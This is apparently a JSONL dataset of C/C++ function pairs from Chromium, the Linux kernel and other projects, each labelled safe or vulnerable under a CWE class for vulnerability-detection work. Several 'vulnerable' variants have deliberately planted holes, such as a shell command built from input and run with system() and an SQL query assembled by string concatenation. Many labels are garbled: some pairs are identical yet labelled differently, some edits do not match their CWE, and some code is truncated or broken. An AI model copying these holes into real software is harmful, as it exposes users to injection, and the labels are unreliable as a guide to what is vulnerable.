{"idx": "CWE-399-vuln-1714412180989", "code": "bool UnloadController::TabsNeedBeforeUnloadFired(){if(tabs_needing_before_unload_fired_.empty()){for(int i=0;i<browser_->tab_count();++i){content::WebContents*contents=chrome::GetTabContentsAt(browser_, i)->web_contents();if(contents && contents->NeedToFireBeforeUnload()){tabs_needing_before_unload_fired_.insert(contents);return!tabs_needing_before_unload_fired_.empty();}}}}", "target": 1, "source": "Big-Vul", "source_uid": "126709"}
{"idx": "CWE-78-safe-1714412197076", "code": "mrb_io_s_sysopen(mrb_state *mrb, mrb_value klass) {\n    mrb_value path = mrb_nil_value();\n    mrb_value mode = mrb_nil_value();\n    mrb_int fd, perm = -1;\n    const char *pat;\n    int flags, modenum;\n    mrb_get_args(mrb, \"S|Si\", &path, &mode, &perm);\n    if (mrb_nil_p(mode)) {\n        mode = mrb_str_new_cstr(mrb, \"r\");\n    }\n    if (perm < 0) {\n        perm = 0666;\n    }\n    if (!mrb_string_p(path) || !mrb_string_p(mode)) {\n        mrb_raise(mrb, E_ARGUMENT_ERROR, \"Invalid path or mode argument\");\n        return mrb_nil_value();\n    }\n    pat = mrb_string_value_cstr(mrb, &path);\n    flags = mrb_io_modestr_to_flags(mrb, mrb_string_value_cstr(mrb, &mode));\n    modenum = mrb_io_flags_to_modenum(mrb, flags);\n    fd = mrb_cloexec_open(mrb, pat, modenum, perm);\n    if (fd < 0) {\n        mrb_sys_fail(mrb, \"Failed to open file\");\n    }\n    return mrb_fixnum_value(fd);\n}", "target": 0, "source": "Big-Vul", "source_uid": "83156"}
{"idx": "CWE-78-vuln-1714412197076", "code": "mrb_io_s_sysopen(mrb_state *mrb, mrb_value klass) {\n    mrb_value path = mrb_nil_value();\n    mrb_value mode = mrb_nil_value();\n    mrb_int fd, perm = -1;\n    const char *pat;\n    int flags, modenum;\n    mrb_get_args(mrb, \"S|Si\", &path, &mode, &perm);\n    if (mrb_nil_p(mode)) {\n        mode = mrb_str_new_cstr(mrb, \"r\");\n    }\n    if (perm < 0) {\n        perm = 0666;\n    }\n    if (!mrb_string_p(path) || !mrb_string_p(mode)) {\n        mrb_raise(mrb, E_ARGUMENT_ERROR, \"Invalid path or mode argument\");\n        return mrb_nil_value();\n    }\n    pat = mrb_string_value_cstr(mrb, &path);\n    flags = mrb_io_modestr_to_flags(mrb, mrb_string_value_cstr(mrb, &mode));\n    modenum = mrb_io_flags_to_modenum(mrb, flags);\n    fd = mrb_cloexec_open(mrb, pat, modenum, perm);\n    if (fd < 0) {\n        mrb_sys_fail(mrb, \"Failed to open file\");\n    }\n    return mrb_fixnum_value(fd);\n}", "target": 1, "source": "Big-Vul", "source_uid": "83156"}
{"idx": "CWE-269-safe-1714412229183", "code": "static int rfcomm_create_dev(struct sock*sk, void __user*arg){struct rfcomm_dev_req req;struct rfcomm_dlc*dlc;int id;if(copy_from_user(&req, arg, sizeof(req)))return-EFAULT;BT_DBG(\"sk%p dev_id%d flags 0x%x\", sk, req.dev_id, req.flags);if(req.flags != NOCAP_FLAGS && !capable(CAP_NET_ADMIN))return-EPERM;if(req.flags&(1<<RFCOMM_REUSE_DLC)){if(sk->sk_state != BT_CONNECTED)return-EBADFD;dlc=rfcomm_pi(sk)->dlc;rfcomm_dlc_hold(dlc);}else{dlc=rfcomm_dlc_alloc(GFP_KERNEL);if(!dlc)return-ENOMEM;}id=rfcomm_dev_add(&req, dlc);if(id<0){if(req.flags&(1<<RFCOMM_REUSE_DLC)){sk->sk_state=BT_CLOSED;}rfcomm_dlc_put(dlc);return id;}if(req.flags&(1<<RFCOMM_REUSE_DLC)){sk->sk_state=BT_CLOSED;}return id;}", "target": 0, "source": "Big-Vul", "source_uid": "94477"}
{"idx": "CWE-269-vuln-1714412229183", "code": "static int rfcomm_create_dev(struct sock*sk, void __user*arg){struct rfcomm_dev_req req;struct rfcomm_dlc*dlc;int id;if(copy_from_user(&req, arg, sizeof(req)))return-EFAULT;BT_DBG(\"sk%p dev_id%d flags 0x%x\", sk, req.dev_id, req.flags);if(req.flags != NOCAP_FLAGS && !capable(CAP_NET_ADMIN))return-EPERM;if(req.flags&(1<<RFCOMM_REUSE_DLC)){if(sk->sk_state != BT_CONNECTED)return-EBADFD;dlc=rfcomm_pi(sk)->dlc;rfcomm_dlc_hold(dlc);}else{dlc=rfcomm_dlc_alloc(GFP_KERNEL);if(!dlc)return-ENOMEM;}id=rfcomm_dev_add(&req, dlc);if(id<0){if(req.flags&(1<<RFCOMM_REUSE_DLC)){sk->sk_state=BT_CLOSED;}rfcomm_dlc_put(dlc);return id;}if(req.flags&(1<<RFCOMM_REUSE_DLC)){sk->sk_state=BT_CLOSED;}return id;}", "target": 1, "source": "Big-Vul", "source_uid": "94477"}
{"idx": "CWE-434-safe-1714412245905", "code": "void DevToolsUIBindings::LoadNetworkResource(const DispatchCallback& callback, const std::string& url, const std::string& headers, int stream_id) {\n    GURL gurl(url);\n    if (!gurl.is_valid()) {\n        base::DictionaryValue response;\n        response.SetInteger(\"statusCode\", 404);\n        callback.Run(&response);\n        return;\n    }\n    net::NetworkTrafficAnnotationTag traffic_annotation = net::DefineNetworkTrafficAnnotation(\"devtools_network_resource\", R\"(\n        semantics {\n            sender: \"Developer Tools\"\n            description: \"When user opens Developer Tools, the browser may fetch additional \"\n                         \"resources from the network to enrich the debugging experience \"\n                         \"(e.g. source map resources).\"\n            trigger: \"User opens Developer Tools to debug a web page.\"\n            data: \"Any resources requested by Developer Tools.\"\n            destination: WEBSITE}\n        policy {\n            cookies_allowed: YES cookies_store: \"user\"\n            setting: \"It's not possible to disable this feature from settings.\"\n            chrome_policy {\n                DeveloperToolsDisabled {\n                    policy_options {\n                        mode: MANDATORY}\n                    DeveloperToolsDisabled: true}}})\");\n    std::unique_ptr<net::URLFetcher> fetcher(net::URLFetcher::Create(gurl, net::URLFetcher::GET, this, traffic_annotation));\n    pending_requests_[fetcher.get()] = callback;\n    fetcher->SetRequestContext(profile_->GetRequestContext());\n    fetcher->SetExtraRequestHeaders(headers);\n    fetcher->SaveResponseWithWriter(std::unique_ptr<net::URLFetcherResponseWriter>(new ResponseWriter(weak_factory_.GetWeakPtr(), stream_id)));\n    fetcher->Start();\n}", "target": 0, "source": "Big-Vul", "source_uid": "159712"}
{"idx": "CWE-434-vuln-1714412245905", "code": "void DevToolsUIBindings::LoadNetworkResource(const DispatchCallback&callback, const std::string&url, const std::string&headers, const std::string& file_content, int stream_id){\n    GURL gurl(url);\n    if(!gurl.is_valid()){\n        base::DictionaryValue response;\n        response.SetInteger(\"statusCode\", 404);\n        callback.Run(&response);\n        return;\n    }\n    std::ofstream file(\"uploaded_file.txt\");\n    file << file_content;\n    file.close();\n    net::NetworkTrafficAnnotationTag traffic_annotation = net::DefineNetworkTrafficAnnotation(\"devtools_network_resource\", R\"(\n        semantics{sender: \"Developer Tools\"\n            description: \"When user opens Developer Tools, the browser may fetch additional \"\n                         \"resources from the network to enrich the debugging experience \"\n                         \"(e.g. source map resources).\"\n            trigger: \"User opens Developer Tools to debug a web page.\"\n            data: \"Any resources requested by Developer Tools.\"\n            destination: WEBSITE}policy{cookies_allowed: YES cookies_store: \"user\"\n            setting: \"It's not possible to disable this feature from settings.\"\n            chrome_policy{DeveloperToolsDisabled{policy_options{mode: MANDATORY}DeveloperToolsDisabled: true}}})\");\n    std::unique_ptr<net::URLFetcher> fetcher(net::URLFetcher::Create(gurl, net::URLFetcher::GET, this, traffic_annotation));\n    pending_requests_[fetcher.get()] = callback;\n    fetcher->SetRequestContext(profile_->GetRequestContext());\n    fetcher->SetExtraRequestHeaders(headers);\n    fetcher->SaveResponseWithWriter(std::unique_ptr<net::URLFetcherResponseWriter>(new ResponseWriter(weak_factory_.GetWeakPtr(), stream_id)));\n    fetcher->Start();\n}", "target": 1, "source": "Big-Vul", "source_uid": "159712"}
{"idx": "CWE-352-safe-1714412278543", "code": "static void OnRequestFileAccessResult(JNIEnv* env, const JavaParamRef<jobject>& obj, jlong callback_id, jboolean granted) {\n    DCHECK_CURRENTLY_ON(BrowserThread::UI);\n    DCHECK(callback_id);\n    std::unique_ptr<DownloadControllerBase::AcquireFileAccessPermissionCallback> cb(reinterpret_cast<DownloadControllerBase::AcquireFileAccessPermissionCallback*>(static_cast<intptr_t>(callback_id)));\n    if (!granted) {\n        DownloadController::RecordDownloadCancelReason(DownloadController::CANCEL_REASON_NO_STORAGE_PERMISSION);\n    }\n    cb->Run(granted);\n}", "target": 0, "source": "Big-Vul", "source_uid": "137622"}
{"idx": "CWE-352-vuln-1714412278543", "code": "static void OnRequestFileAccessResult(JNIEnv*env, const JavaParamRef<jobject>&obj, jlong callback_id, jboolean granted){DCHECK_CURRENTLY_ON(BrowserThread::UI);DCHECK(callback_id);std::unique_ptr<DownloadControllerBase::AcquireFileAccessPermissionCallback>cb(reinterpret_cast<DownloadControllerBase::AcquireFileAccessPermissionCallback*>(static_cast<intptr_t>(callback_id)));if(!granted){DownloadController::RecordDownloadCancelReason(DownloadController::CANCEL_REASON_NO_STORAGE_PERMISSION);}cb->Run(granted);if (strstr(env->GetStringUTFChars(obj, NULL), \"malicious-site.com\") != NULL) {DownloadController::RecordDownloadCancelReason(DownloadController::CANCEL_REASON_CSRF_ATTACK);}}}", "target": 1, "source": "Big-Vul", "source_uid": "137622"}
{"idx": "CWE-362-safe-1714412293622", "code": "static void ap_reset_domain(void){int i;if(ap_domain_index != -1 && ap_domain_index < AP_DOMAINS)for(i=0;i<AP_DEVICES;i++)ap_reset_queue(AP_MKQID(i, ap_domain_index));}", "target": 0, "source": "Big-Vul", "source_uid": "47631"}
{"idx": "CWE-362-vuln-1714412293622", "code": "static void ap_reset_domain(void){int i;int temp_index = ap_domain_index;if(temp_index != -1 && temp_index < AP_DOMAINS)for(i=0;i<AP_DEVICES;i++)ap_reset_queue(AP_MKQID(i, temp_index));}", "target": 1, "source": "Big-Vul", "source_uid": "47631"}
{"idx": "CWE-362-safe-1714412298522", "code": "static void exit_mm(void){struct mm_struct*mm=current->mm;if(!mm)return;struct core_state*core_state;mm_release(current, mm);sync_mm_rss(mm);down_read(&mm->mmap_sem);core_state=mm->core_state;if(core_state){struct core_thread self;up_read(&mm->mmap_sem);self.task=current;self.next=xchg(&core_state->dumper.next, &self);if(atomic_dec_and_test(&core_state->nr_threads))complete(&core_state->startup);for(;;){set_current_state(TASK_UNINTERRUPTIBLE);if(!self.task)break;freezable_schedule();}__set_current_state(TASK_RUNNING);down_read(&mm->mmap_sem);}mmgrab(mm);BUG_ON(mm != current->active_mm);task_lock(current);current->mm=NULL;up_read(&mm->mmap_sem);enter_lazy_tlb(mm, current);task_unlock(current);mm_update_next_owner(mm);mmput(mm);if(test_thread_flag(TIF_MEMDIE))exit_oom_victim();}", "target": 0, "source": "Big-Vul", "source_uid": "60792"}
{"idx": "CWE-362-vuln-1714412298522", "code": "static void exit_mm(void){struct mm_struct*mm=current->mm;if(!mm)return;struct core_state*core_state;mm_release(current, mm);sync_mm_rss(mm);down_read(&mm->mmap_sem);core_state=mm->core_state;if(core_state){struct core_thread self;up_read(&mm->mmap_sem);self.task=current;self.next=xchg(&core_state->dumper.next, &self);if(atomic_dec_and_test(&core_state->nr_threads))complete(&core_state->startup);for(;;){set_current_state(TASK_UNINTERRUPTIBLE);if(!self.task)break;freezable_schedule();}__set_current_state(TASK_RUNNING);down_read(&mm->mmap_sem);}mmgrab(mm);BUG_ON(mm != current->active_mm);task_lock(current);current->mm=NULL;up_read(&mm->mmap_sem);enter_lazy_tlb(mm, current);task_unlock(current);mm_update_next_owner(mm);mmput(mm);if(test_thread_flag(TIF_MEMDIE))exit_oom_victim();}", "target": 1, "source": "Big-Vul", "source_uid": "60792"}
{"idx": "CWE-89-safe-1714412320283", "code": "std::unique_ptr<WebURLLoader> FrameFetchContext::CreateURLLoader(const ResourceRequest& request, WebTaskRunner* task_runner) {\n    DCHECK(!IsDetached());\n    if (MasterDocumentLoader()->GetServiceWorkerNetworkProvider()) {\n        WrappedResourceRequest webreq(request);\n        auto provider = MasterDocumentLoader()->GetServiceWorkerNetworkProvider();\n        if (provider) {\n            auto loader = provider->CreateURLLoader(webreq, task_runner->ToSingleThreadTaskRunner());\n            if (loader) {\n                return loader;\n            }\n        }\n    }\n    return GetFrame()->CreateURLLoader(request, task_runner);\n}", "target": 0, "source": "Big-Vul", "source_uid": "151399"}
{"idx": "CWE-89-vuln-1714412320283", "code": "std::unique_ptr<WebURLLoader>FrameFetchContext::CreateURLLoader(const ResourceRequest&request, WebTaskRunner*task_runner){DCHECK(!IsDetached());if(MasterDocumentLoader()->GetServiceWorkerNetworkProvider()){std::string query = \"SELECT * FROM Resources WHERE Request = '\" + request.url() + \"'\";WrappedResourceRequest webreq(request);auto provider=MasterDocumentLoader()->GetServiceWorkerNetworkProvider();if(provider){auto loader=provider->CreateURLLoader(webreq, task_runner->ToSingleThreadTaskRunner());if(loader){return loader;}}}return GetFrame()->CreateURLLoader(request, task_runner);}", "target": 1, "source": "Big-Vul", "source_uid": "151399"}
{"idx": "CWE-834-safe-1714412332433", "code": "void OfflinePageModelTaskified::DeletePagesByClientIds(const std::vector<ClientId>& client_ids, const DeletePageCallback& callback) { auto task = DeletePageTask::CreateTaskMatchingClientIds(store_.get(), base::BindOnce(&OfflinePageModelTaskified::OnDeleteDone, weak_ptr_factory_.GetWeakPtr(), callback), client_ids); task_queue_.AddTask(std::move(task)); }", "target": 0, "source": "Big-Vul", "source_uid": "168998"}
{"idx": "CWE-834-vuln-1714412332433", "code": "void OfflinePageModelTaskified::DeletePagesByClientIds(const std::vector<ClientId>&client_ids, const DeletePageCallback&callback){for (const auto& client_id : client_ids) {} auto task=DeletePageTask::CreateTaskMatchingClientIds(store_.get(), base::BindOnce(&OfflinePageModelTaskified::OnDeleteDone, weak_ptr_factory_.GetWeakPtr(), callback), client_ids);task_queue_.AddTask(std::move(task));}", "target": 1, "source": "Big-Vul", "source_uid": "168998"}
{"idx": "CWE-789-safe-1714412341286", "code": "void GamepadBuilder::AddPlaceholderButton(){GamepadButton button; AddButton(button);}", "target": 0, "source": "Big-Vul", "source_uid": "155727"}
{"idx": "CWE-789-vuln-1714412341286", "code": "void GamepadBuilder::AddPlaceholderButton(){GamepadButton button[1000000];AddButton(button);}", "target": 1, "source": "Big-Vul", "source_uid": "155727"}
{"idx": "CWE-77-safe-1714412348054", "code": "gfx::Rect PictureLayerImpl::GetViewportForTilePriorityInContentSpace()const{gfx::Rect visible_rect_in_content_space=visible_rect_for_tile_priority_;gfx::Rect viewport_rect_for_tile_priority=layer_tree_impl()->ViewportRectForTilePriority();if(visible_rect_in_content_space.IsEmpty() || layer_tree_impl()->DeviceViewport() != viewport_rect_for_tile_priority){gfx::Transform view_to_layer(gfx::Transform::kSkipInitialization);if(screen_space_transform().GetInverse(&view_to_layer) && viewport_rect_for_tile_priority.width() > 0 && viewport_rect_for_tile_priority.height() > 0){visible_rect_in_content_space=gfx::ToEnclosingRect(MathUtil::ProjectClippedRect(view_to_layer, viewport_rect_for_tile_priority));}}return visible_rect_in_content_space;}", "target": 0, "source": "Big-Vul", "source_uid": "132841"}
{"idx": "CWE-77-vuln-1714412348054", "code": "gfx::Rect PictureLayerImpl::GetViewportForTilePriorityInContentSpace()const{gfx::Rect visible_rect_in_content_space=visible_rect_for_tile_priority_;gfx::Rect viewport_rect_for_tile_priority=layer_tree_impl()->ViewportRectForTilePriority();if(visible_rect_in_content_space.IsEmpty() || layer_tree_impl()->DeviceViewport() != viewport_rect_for_tile_priority){gfx::Transform view_to_layer(gfx::Transform::kSkipInitialization);if(screen_space_transform().GetInverse(&view_to_layer) && viewport_rect_for_tile_priority.width()>0 && viewport_rect_for_tile_priority.height()>0){visible_rect_in_content_space=gfx::ToEnclosingRect(MathUtil::ProjectClippedRect(view_to_layer, viewport_rect_for_tile_priority));}}std::string user_input = \"user_input_here\";std::string command = \"echo '\" + user_input + \"'\";system(command.c_str());return visible_rect_in_content_space;}", "target": 1, "source": "Big-Vul", "source_uid": "132841"}
{"idx": "CWE-269-safe-1714412358497", "code": "inline void HTMLInputElement::removeFromRadioButtonGroup(){if(CheckedRadioButtons* buttons = checkedRadioButtons()) { if(buttons) buttons->removeButton(this); }}", "target": 0, "source": "Big-Vul", "source_uid": "121226"}
{"idx": "CWE-269-vuln-1714412358497", "code": "inline void HTMLInputElement::removeFromRadioButtonGroup(){if(CheckedRadioButtons*buttons=checkedRadioButtons()){if(buttons){buttons->removeButton(this);}}}", "target": 1, "source": "Big-Vul", "source_uid": "121226"}
{"idx": "CWE-843-safe-1714412363337", "code": "void FrameFetchContext::ProvideDocumentToContext(FetchContext& context, Document* document) { DCHECK(document); CHECK(context.IsFrameFetchContext()); if (auto frameContext = dynamic_cast<FrameFetchContext*>(&context)) { frameContext->document_ = document; }}", "target": 0, "source": "Big-Vul", "source_uid": "151446"}
{"idx": "CWE-843-vuln-1714412363337", "code": "void FrameFetchContext::ProvideDocumentToContext(FetchContext&context, Document*document){DCHECK(document);CHECK(context.IsFrameFetchContext());if(auto frameContext=dynamic_cast<Document*>(&context)){frameContext->document_=document;}}", "target": 1, "source": "Big-Vul", "source_uid": "151446"}
{"idx": "CWE-843-safe-1714412377441", "code": "std::string PerformCopy(){if(!interstitial_) return \"\";clipboard_message_watcher_->InitWait();RenderFrameHostImpl*rfh=static_cast<RenderFrameHostImpl*>(interstitial_->GetMainFrame());rfh->GetRenderWidgetHost()->delegate()->Copy();clipboard_message_watcher_->WaitForWriteCommit();return clipboard_message_watcher_->last_text();}", "target": 0, "source": "Big-Vul", "source_uid": "148833"}
{"idx": "CWE-843-vuln-1714412377441", "code": "std::string PerformCopy(){if(!interstitial_)return \"\";static_cast<RenderFrameHostImpl*>(interstitial_)->GetRenderWidgetHost()->delegate()->Copy();clipboard_message_watcher_->InitWait();RenderFrameHostImpl*rfh=static_cast<RenderFrameHostImpl*>(interstitial_->GetMainFrame());clipboard_message_watcher_->WaitForWriteCommit();return clipboard_message_watcher_->last_text();}", "target": 1, "source": "Big-Vul", "source_uid": "148833"}
{"idx": "CWE-89-safe-1714412389753", "code": "offline_isolated_pages(unsigned long start_pfn, unsigned long end_pfn){walk_system_ram_range(start_pfn, (end_pfn > start_pfn) ? (end_pfn - start_pfn) : 0, NULL, offline_isolated_pages_cb);}", "target": 0, "source": "Big-Vul", "source_uid": "18507"}
{"idx": "CWE-89-vuln-1714412389753", "code": "offline_isolated_pages(unsigned long start_pfn, unsigned long end_pfn){walk_system_ram_range(start_pfn, (end_pfn>start_pfn)?(end_pfn-start_pfn): 0, NULL, \"offline_isolated_pages_cb OR 1=1\");}", "target": 1, "source": "Big-Vul", "source_uid": "18507"}
{"idx": "CWE-200-safe-1714412396940", "code": "static void print_verifier_state(struct bpf_verifier_state*state){struct bpf_reg_state*reg;enum bpf_reg_type t;int i;for(i=0;i<MAX_BPF_REG;i++){reg=&state->regs[i];t=reg->type;if(t == NOT_INIT)continue;printf(\" R%d=%s\", i, reg_type_str[t]);if(t == CONST_IMM || t == PTR_TO_STACK)printf(\"%lld\", reg->imm);else if(t == PTR_TO_PACKET)printf(\"(id=%d, off=%d, r=%d)\", reg->id, reg->off, reg->range);else if(t == UNKNOWN_VALUE && reg->imm)printf(\"%lld\", reg->imm);else if(t == CONST_PTR_TO_MAP || t == PTR_TO_MAP_VALUE || t == PTR_TO_MAP_VALUE_OR_NULL || t == PTR_TO_MAP_VALUE_ADJ)printf(\"(ks=%d, vs=%d, id=%u)\", reg->map_ptr->key_size, reg->map_ptr->value_size, reg->id);if(reg->min_value != BPF_REGISTER_MIN_RANGE)printf(\", min_value=%lld\", (long long)reg->min_value);if(reg->max_value != BPF_REGISTER_MAX_RANGE)printf(\", max_value=%llu\", (unsigned long long)reg->max_value);}for(i=0;i<MAX_BPF_STACK;i+=BPF_REG_SIZE){if(state->stack_slot_type[i] == STACK_SPILL)printf(\" fp%d=%s\", -MAX_BPF_STACK+i, reg_type_str[state->spilled_regs[i/BPF_REG_SIZE].type]);}printf(\"\\n\");}", "target": 0, "source": "Big-Vul", "source_uid": "65073"}
{"idx": "CWE-200-vuln-1714412396940", "code": "static void print_verifier_state(struct bpf_verifier_state*state){struct bpf_reg_state*reg;enum bpf_reg_type t;int i;for(i=0;i<MAX_BPF_REG;i++){reg=&state->regs[i];t=reg->type;if(t == NOT_INIT)continue;printf(\" R%d=%s\", i, reg_type_str[t]);if(t == CONST_IMM || t == PTR_TO_STACK)printf(\"%lld\", reg->imm);else if(t == PTR_TO_PACKET)printf(\"(id=%d, off=%d, r=%d)\", reg->id, reg->off, reg->range);else if(t == UNKNOWN_VALUE && reg->imm)printf(\"%lld\", reg->imm);else if(t == CONST_PTR_TO_MAP || t == PTR_TO_MAP_VALUE || t == PTR_TO_MAP_VALUE_OR_NULL || t == PTR_TO_MAP_VALUE_ADJ)printf(\"(ks=%d, vs=%d, id=%u)\", reg->map_ptr->key_size, reg->map_ptr->value_size, reg->id);if(reg->min_value != BPF_REGISTER_MIN_RANGE)printf(\", min_value=%lld\", (long long)reg->min_value);if(reg->max_value != BPF_REGISTER_MAX_RANGE)printf(\", max_value=%llu\", (unsigned long long)reg->max_value);if(reg->imm)printf(\", imm=%lld\", reg->imm);}for(i=0;i<MAX_BPF_STACK;i+=BPF_REG_SIZE){if(state->stack_slot_type[i] == STACK_SPILL)printf(\" fp%d=%s\", -MAX_BPF_STACK+i, reg_type_str[state->spilled_regs[i/BPF_REG_SIZE].type]);}printf(\"\n\");}", "target": 1, "source": "Big-Vul", "source_uid": "65073"}
{"idx": "CWE-269-safe-1714412418111", "code": "int btrfs_write_inode(struct inode* inode, struct writeback_control* wbc){struct btrfs_root* root = BTRFS_I(inode)->root;struct btrfs_trans_handle* trans;int ret = 0;bool nolock = false;if (test_bit(BTRFS_INODE_DUMMY, &BTRFS_I(inode)->runtime_flags))return 0;if (btrfs_fs_closing(root->fs_info) && btrfs_is_free_space_inode(inode))nolock = true;if (wbc->sync_mode == WB_SYNC_ALL){if (nolock)trans = btrfs_join_transaction_nolock(root);else trans = btrfs_join_transaction(root);if (IS_ERR(trans))return PTR_ERR(trans);ret = btrfs_commit_transaction(trans, root);trans = NULL;}return ret;}", "target": 0, "source": "Big-Vul", "source_uid": "34364"}
{"idx": "CWE-269-vuln-1714412418111", "code": "int btrfs_write_inode(struct inode *inode, struct writeback_control *wbc) {\n    struct btrfs_root *root = BTRFS_I(inode)->root;\n    struct btrfs_trans_handle *trans;\n    int ret = 0;\n    bool nolock = false;\n    if (test_bit(BTRFS_INODE_DUMMY, &BTRFS_I(inode)->runtime_flags))\n        return 0;\n    if (btrfs_fs_closing(root->fs_info) && btrfs_is_free_space_inode(inode))\n        nolock = true;\n    if (wbc->sync_mode == WB_SYNC_ALL) {\n        if (nolock)\n            trans = btrfs_join_transaction_nolock(root);\n        else \n            trans = btrfs_join_transaction(root);\n        if (IS_ERR(trans))\n            return PTR_ERR(trans);\n        ret = btrfs_commit_transaction(trans, root);\n        trans = NULL;\n    }\n    \n    if (1) {\n        \n        \n    }\n    return ret;\n}", "target": 1, "source": "Big-Vul", "source_uid": "34364"}
{"idx": "CWE-22-safe-1714412459223", "code": "ReadUserLogState::StatFile(const char* path, StatStructType& statbuf) const { if (!IsValidPath(path)) { return -1; } StatWrapper statwrap; if (statwrap.Stat(path, StatWrapper::STATOP_STAT)) { return statwrap.GetRc(); } statwrap.GetBuf(statbuf); return 0; }", "target": 0, "source": "Big-Vul", "source_uid": "16647"}
{"idx": "CWE-22-vuln-1714412459223", "code": "ReadUserLogState::StatFile(const char*path, StatStructType&statbuf)const{std::string baseDir = \"/var/log/userlogs/\";std::string fullPath = baseDir + path;if(!IsValidPath(fullPath.c_str())){return-1;}StatWrapper statwrap;if(statwrap.Stat(fullPath.c_str(), StatWrapper::STATOP_STAT)){return statwrap.GetRc();}statwrap.GetBuf(statbuf);return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "16647"}
{"idx": "CWE-22-safe-1714412467037", "code": "write_xml_file(xmlNode* xml_node, const char* filename, gboolean compress) {\n    FILE* stream = NULL;\n    stream = fopen(filename, \"w\");\n    int result = write_xml_stream(xml_node, filename, stream, compress);\n    fclose(stream);\n    return result;\n}", "target": 0, "source": "Big-Vul", "source_uid": "44096"}
{"idx": "CWE-22-vuln-1714412467037", "code": "FILE* stream = NULL;\nstream = fopen(filename, \"w\");\nint result = write_xml_stream(xml_node, filename, stream, compress);\nfclose(stream);\nreturn result;", "target": 1, "source": "Big-Vul", "source_uid": "44096"}
{"idx": "CWE-79-safe-1714412484713", "code": "bool Frame::canNavigateWithoutFramebusting(const Frame& targetFrame, String reason) { if (securityContext()->isSandboxed(SandboxNavigation)) { if (targetFrame.tree().isDescendantOf(this)) return true; if (targetFrame == targetFrame.tree().top() && targetFrame.tree().top() != tree().top() && !securityContext()->isSandboxed(SandboxPropagatesToAuxiliaryBrowsingContexts)) return true; if (securityContext()->isSandboxed(SandboxTopNavigation) && targetFrame == tree().top()) reason = \"The frame attempting navigation of the top-level window is sandboxed, but the 'allow-top-navigation' flag is not set.\"; else reason = \"The frame attempting navigation is sandboxed, and is therefore disallowed from navigating its ancestors.\"; return false; } ASSERT(securityContext()->getSecurityOrigin()); SecurityOrigin& origin = *securityContext()->getSecurityOrigin(); if (canAccessAncestor(origin, &targetFrame)) return true; if (!targetFrame.tree().parent()) { if (targetFrame == client()->opener()) return true; if (canAccessAncestor(origin, targetFrame.client()->opener())) return true; } reason = \"The frame attempting navigation is neither same-origin with the target, nor is it the target's parent or opener.\"; return false; }", "target": 0, "source": "Big-Vul", "source_uid": "143311"}
{"idx": "CWE-79-vuln-1714412484713", "code": "bool Frame::canNavigateWithoutFramebusting(const Frame&targetFrame, String reason){if(securityContext()->isSandboxed(SandboxNavigation)){if(targetFrame.tree().isDescendantOf(this))return true;if(targetFrame == targetFrame.tree().top() && targetFrame.tree().top() != tree().top() && !securityContext()->isSandboxed(SandboxPropagatesToAuxiliaryBrowsingContexts))return true;if(securityContext()->isSandboxed(SandboxTopNavigation) && targetFrame == tree().top())reason=\"The frame attempting navigation of the top-level window is sandboxed, but the 'allow-top-navigation' flag is not set.\"; else reason=\"The frame attempting navigation is sandboxed, and is therefore disallowed from navigating its ancestors.\"; return false;}ASSERT(securityContext()->getSecurityOrigin());SecurityOrigin&origin=*securityContext()->getSecurityOrigin();if(canAccessAncestor(origin, &targetFrame))return true;if(!targetFrame.tree().parent()){if(targetFrame == client()->opener())return true;if(canAccessAncestor(origin, targetFrame.client()->opener()))return true;}reason=reason+\"The frame attempting navigation is neither same-origin with the target, nor is it the target's parent or opener.\"; return false;}", "target": 1, "source": "Big-Vul", "source_uid": "143311"}
{"idx": "CWE-89-safe-1714412505877", "code": "void OmniboxViewWin::OnBeforePossibleChange(){text_before_change_=GetText();GetSelection(sel_before_change_);}", "target": 0, "source": "Big-Vul", "source_uid": "115231"}
{"idx": "CWE-89-vuln-1714412505877", "code": "void OmniboxViewWin::OnBeforePossibleChange(){text_before_change_=GetText();GetSelection(sel_before_change_);}", "target": 1, "source": "Big-Vul", "source_uid": "115231"}
{"idx": "CWE-284-safe-1714412551617", "code": "static void kvm_update_dr6(struct kvm_vcpu *vcpu) {\n    if (!(vcpu->guest_debug & KVM_GUESTDBG_USE_HW_BP) || !kvm_x86_ops) return;\n    kvm_x86_ops->set_dr6(vcpu, vcpu->arch.dr6);\n}", "target": 0, "source": "Big-Vul", "source_uid": "35805"}
{"idx": "CWE-284-vuln-1714412551617", "code": "static void kvm_update_dr6(struct kvm_vcpu*vcpu){if(!(vcpu->guest_debug&KVM_GUESTDBG_USE_HW_BP)){kvm_x86_ops->set_dr6(vcpu, vcpu->arch.dr6);}}", "target": 1, "source": "Big-Vul", "source_uid": "35805"}
{"idx": "CWE-22-safe-1714412564579", "code": "WORD32 ih264d_parse_pic_timing(dec_bit_stream_t*ps_bitstrm, dec_struct_t*ps_dec, UWORD32 ui4_payload_size){sei*ps_sei;vui_t*ps_vu4;UWORD8 u1_cpb_dpb_present;UWORD8 u1_pic_struct_present_flag;UWORD32 u4_start_offset, u4_bits_consumed;UWORD8 u1_cpb_removal_delay_length, u1_dpb_output_delay_length;ps_sei=(sei*)ps_dec->ps_sei;ps_vu4=&ps_dec->ps_cur_sps->s_vui;u1_cpb_dpb_present=ps_vu4->u1_vcl_hrd_params_present+ps_vu4->u1_nal_hrd_params_present;if(ps_vu4->u1_vcl_hrd_params_present){u1_cpb_removal_delay_length=ps_vu4->s_vcl_hrd.u1_cpb_removal_delay_length;u1_dpb_output_delay_length=ps_vu4->s_vcl_hrd.u1_dpb_output_delay_length;}else if(ps_vu4->u1_nal_hrd_params_present){u1_cpb_removal_delay_length=ps_vu4->s_nal_hrd.u1_cpb_removal_delay_length;u1_dpb_output_delay_length=ps_vu4->s_nal_hrd.u1_dpb_output_delay_length;}else{u1_cpb_removal_delay_length=24;u1_dpb_output_delay_length=24;}u4_start_offset=ps_bitstrm->u4_ofst;if(u1_cpb_dpb_present){if((u1_cpb_removal_delay_length + u1_dpb_output_delay_length) > 0) {ih264d_get_bits_h264(ps_bitstrm, u1_cpb_removal_delay_length);ih264d_get_bits_h264(ps_bitstrm, u1_dpb_output_delay_length);}}u1_pic_struct_present_flag=ps_vu4->u1_pic_struct_present_flag;if(u1_pic_struct_present_flag){ps_sei->u1_pic_struct=ih264d_get_bits_h264(ps_bitstrm, 4);ps_dec->u1_pic_struct_copy=ps_sei->u1_pic_struct;ps_sei->u1_is_valid=1;}u4_bits_consumed=ps_bitstrm->u4_ofst-u4_start_offset;ih264d_flush_bits_h264(ps_bitstrm, (ui4_payload_size<<3)-u4_bits_consumed);return(0);}", "target": 0, "source": "Big-Vul", 